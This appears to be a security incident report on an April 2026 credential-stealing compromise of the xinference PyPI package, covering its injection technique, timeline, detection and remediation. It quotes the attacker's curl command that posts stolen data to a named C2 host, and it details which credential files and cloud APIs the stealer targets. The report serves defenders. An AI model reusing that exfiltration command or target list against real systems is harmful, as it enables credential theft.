# TeamPCP xinference PyPI Compromise — Two-Stage Credential Stealer in LLM Inference Framework

**Date:** April 2026
**Ecosystem:** PyPI
**Severity:** Critical
**Type:** Credential Stealer / Supply chain injection
**Sources:**
- [StepSecurity — TeamPCP Injects Two-Stage Credential Stealer into xinference PyPI Package](https://www.stepsecurity.io/blog/teampcp-injects-two-stage-credential-stealer-into-xinference-pypi-package)
- [Semgrep — Security Advisory: $foo compromised on $packagemanager](https://semgrep.dev/blog/2026/security-advisory-pgserve-xinference-kube-health)

---

## Summary

On April 22, 2026, three consecutive releases of the `xinference` PyPI package — versions 2.6.0, 2.6.1, and 2.6.2 — were found to contain a two-stage credential-stealing payload injected into `xinference/__init__.py`. The payload executes the moment any application runs `import xinference`, requiring no install hook and leaving no artifacts after exfiltration. All three versions have since been yanked from PyPI.

StepSecurity attributes the attack to TeamPCP, the same threat actor behind the litellm PyPI compromise (March 24, 2026) and the telnyx PyPI compromise (March 27, 2026). The actor marker `# hacked by teampcp` is embedded in the decoded first-stage payload. A distinctive feature of this campaign is that the attacker published three rapid versions in a single day, iterating the injection technique across each — moving from module-scope placement (obvious in diffs) to a function-hidden, async-detached form — a pattern of live operational refinement also seen in prior TeamPCP campaigns.

Xinference (Xorbits Inference) is an open-source LLM inference framework widely used in AI application development and enterprise MLOps pipelines. Environments running xinference typically hold elevated cloud credentials — GPU instance IAM roles, model registry tokens, object storage keys, and Kubernetes service account tokens — making it a high-value credential theft target.

Notably, this campaign diverges from TeamPCP's prior playbook in one technical respect: the xinference payload sends stolen data as a plain compressed archive without the AES-256-CBC + RSA-4096 OAEP encryption used in litellm and telnyx. StepSecurity notes this may indicate a copycat or a simplified toolkit variant.

---

## Compromised Artifacts

| Package | Malicious Version(s) | Injection File | Status |
|---------|---------------------|----------------|--------|
| `xinference` | 2.6.0, 2.6.1, 2.6.2 | `xinference/__init__.py` | Yanked from PyPI |

---

## How It Worked

### Injection Evolution Across Three Versions

All three versions inject malicious code into the same file — `xinference/__init__.py` — which Python executes on every `import xinference`. There are no `.pth` files and no install hooks.

**Version 2.6.0 — Module-scope injection (most obvious):**
The malicious `subprocess.Popen` call sits at module scope between legitimate imports, firing immediately on import. The detached subprocess suppresses all output.

**Version 2.6.1 — Moved inside `_install()`, sync `exec()`:**
The attacker moves the payload inside the existing legitimate `_install()` function. However, this version mistakenly uses synchronous `exec()` rather than a detached subprocess, making execution blocking. The `Popen` call is commented out — an iterating work-in-progress.

**Version 2.6.2 — Final form (hidden + async):**
The payload stays inside `_install()` but the detached `subprocess.Popen` is restored. A `tempfile` import is added at the top level (required by stage 1). This achieves both stealth (hidden in a legitimate function) and asynchrony (non-blocking, stderr suppressed).

### Stage 1 — Wrapper and start() Function

The base64 blob (`test` variable) in all three versions decodes to an identical first-stage Python script opening with:

```python
# hacked by teampcp
import os, base64, tempfile, subprocess, sys
```

The `start()` function decodes the embedded stage-2 blob (`jk`), pipes it to a fresh Python interpreter via stdin (never written to disk), captures all output to a temp file, compresses it as `love.tar.gz`, and POSTs it to the attacker's C2:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  "https://whereisitat.lucyatemysuperbox.space/" \
  -H "X-QT-SR: 14" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@/tmp/.../love.tar.gz"
```

The header `X-QT-SR: 14` is a server-side routing key distinguishing xinference-originated exfiltration from other TeamPCP campaigns. Python's `TemporaryDirectory` context manager auto-cleans `love.tar.gz` and all temp files after the POST — no artifacts remain on disk.

### Stage 2 — Comprehensive Credential Collector

The stage-2 script (`jk`) is a self-contained Python credential harvester piped to a fresh interpreter via stdin. It targets every credential type common in cloud-connected ML environments:

| Category | What Is Collected |
|----------|-------------------|
| System recon | hostname, whoami, uname, IP addresses, all environment variables |
| SSH keys | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`, `authorized_keys`, `known_hosts`, `/etc/ssh/` host keys |
| AWS | `~/.aws/credentials`, `~/.aws/config`, all `AWS_*` env vars, live IMDS v2 call for EC2 instance role creds, live calls to AWS Secrets Manager (`ListSecrets`) and SSM Parameter Store (`DescribeParameters`) |
| Kubernetes | `/var/run/secrets/kubernetes.io/serviceaccount/token`, `~/.kube/config`, `kubectl get secrets --all-namespaces` |
| GCP / Azure / Docker | `~/.config/gcloud/`, `application_default_credentials.json`, `~/.azure/`, `~/.docker/config.json` |
| `.env` files | Deep recursive walk (depth 6) from all home dirs, `/opt`, `/srv`, `/var/www`, `/app`, `/data`, `/tmp` for `.env`, `.env.local`, `.env.production`, `.env.staging`, `.env.development` |
| Developer credentials | `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.vault-token`, `~/.netrc`, `~/.pgpass`, shell history files |
| TLS/SSL private keys | `/etc/ssl/private/`, `/etc/letsencrypt/` (depth 4), all `.pem`, `.key`, `.p12`, `.pfx` files (depth 5) |
| CI/CD | `terraform.tfvars`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `terraform.tfstate` |
| Crypto wallets | Bitcoin config, Ethereum keystore, Cardano `.skey`/`.vkey`, Solana `~/.config/solana/`, `validator-keypair.json` |
| System files | `/etc/passwd`, `/etc/shadow`, recent `auth.log` accepted logins, Slack/Discord webhook URLs |

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Mar 24, 2026 | TeamPCP's prior litellm PyPI compromise |
| Mar 27, 2026 | TeamPCP's prior telnyx PyPI compromise |
| Apr 22, 2026 | `xinference==2.6.0` published to PyPI with credential stealer in `__init__.py` |
| Apr 22, 2026 | `xinference==2.6.1` published — injection moved inside `_install()`, using sync `exec()` |
| Apr 22, 2026 | `xinference==2.6.2` published — final refined form: async detached subprocess, hidden in function |
| Apr 22, 2026 | StepSecurity identifies all three versions; Harden-Runner confirms exfil to `whereisitat.lucyatemysuperbox.space` is blocked |
| Apr 22, 2026 | All three versions yanked from PyPI |
| Apr 22, 2026 | Semgrep publishes advisory covering xinference alongside pgserve and kube-health packages |

---

## Detection

```bash
# Check installed xinference version
pip show xinference

# If version is 2.6.0, 2.6.1, or 2.6.2, the system is compromised

# Check for malicious test variable in __init__.py
python3 -c "import ast, pathlib; src=pathlib.Path($(pip show xinference 2>/dev/null | grep Location | cut -d' ' -f2)/xinference/__init__.py).read_text(); print('MALICIOUS' if 'hacked by teampcp' in src or 'X-QT-SR' in src else 'clean')" 2>/dev/null

# Grep the source directly for the TeamPCP marker
grep -r "teampcp\|lucyatemysuperbox\|X-QT-SR\|love.tar.gz" $(pip show xinference 2>/dev/null | grep Location | cut -d' ' -f2)/ 2>/dev/null

# Check for remnants of exfiltration attempt (temp files, usually auto-cleaned)
find /tmp -name 'love.tar.gz' 2>/dev/null

# Check network logs for C2 contact
grep -r "lucyatemysuperbox" /var/log/ 2>/dev/null

# Verify package hash against known-malicious wheel hashes
pip download xinference==2.6.0 --no-deps -d /tmp/xin_check 2>/dev/null
sha256sum /tmp/xin_check/xinference-2.6.0-py3-none-any.whl
# MALICIOUS: f677cd06e0dfbd23b6feb47f31d49cb8fcc88ed0487d30143d36d4f54261e3de
# MALICIOUS: 4c5c589f543b1a02251451ab3baaeed7c82851de10fa33f87b95a85e3040c92e (2.6.1)
# MALICIOUS: 96007d4ee4171e383cecdf7a34b606bfcb78eff435182dc86daa49a17153dcd3 (2.6.2)
```

---

## Remediation

1. **Check the installed version:**
   ```bash
   pip show xinference
   ```
   If the `Version` field shows 2.6.0, 2.6.1, or 2.6.2, the system is compromised.

2. **Downgrade immediately** to the last safe version:
   ```bash
   pip install "xinference<2.6.0"
   ```

3. **Check for residual artifacts** (auto-cleaned in most cases):
   ```bash
   find /tmp -name 'love.tar.gz' 2>/dev/null
   ```

4. **Audit network logs** for outbound HTTPS to `whereisitat.lucyatemysuperbox.space` — any connection confirms credential exfiltration occurred.

5. **Rotate all credentials** accessible on affected systems: AWS access keys (including EC2 instance role credentials obtained via IMDS), Kubernetes service account tokens and kubeconfig certificates, SSH private keys, GCP service account keys, Azure credentials, all `.env` file values, Docker registry tokens, npm and PyPI tokens, and any API keys in environment variables.

6. **Rotate AWS Secrets Manager and SSM Parameter Store secrets** — the stage-2 collector makes live API calls to both services and retrieves secret values directly using any available AWS credentials.

7. **Review CI/CD pipelines** for any Terraform state files or CI config files that may have been exfiltrated; check for unauthorized runs.

---

## Lessons Learned

- ML inference frameworks (xinference, litellm, telnyx) are high-value targets because they run in environments holding GPU IAM roles, model registry tokens, and Kubernetes credentials — far richer than a typical web app dependency
- Injecting into `__init__.py` requires no special install hook: any `import` of the package — in application code, via CLI, or during service startup — triggers execution. There is no safe install followed by unsafe import
- TeamPCP's rapid multi-version iteration (three versions in one day, each refining the injection technique) shows an actor actively monitoring detection signals and adapting in near-real-time
- The absence of RSA encryption in this campaign (vs. litellm/telnyx) makes attribution ambiguous — a possible copycat using the TeamPCP brand, or a deliberate toolkit simplification
- The campaign header (`X-QT-SR: 14`) confirms TeamPCP's C2 infrastructure uses per-campaign routing keys, consistent with an organized and multi-campaign actor

---

## Related Incidents

- [litellm PyPI — Credential Stealer Hidden in Wheel](./2026-03-litellm-pypi-stealer.md) — Prior TeamPCP campaign, same actor, AES+RSA encryption variant
- [telnyx PyPI — WAV Steganography Credential Stealer (TeamPCP)](./2026-03-telnyx-pypi-wav.md) — Prior TeamPCP campaign with shared RSA key
- [CanisterSprawl: pgserve npm Compromise](./2026-04-pgserve-npm-canistersprawl.md) — Concurrent April 2026 npm supply chain attack reported same day
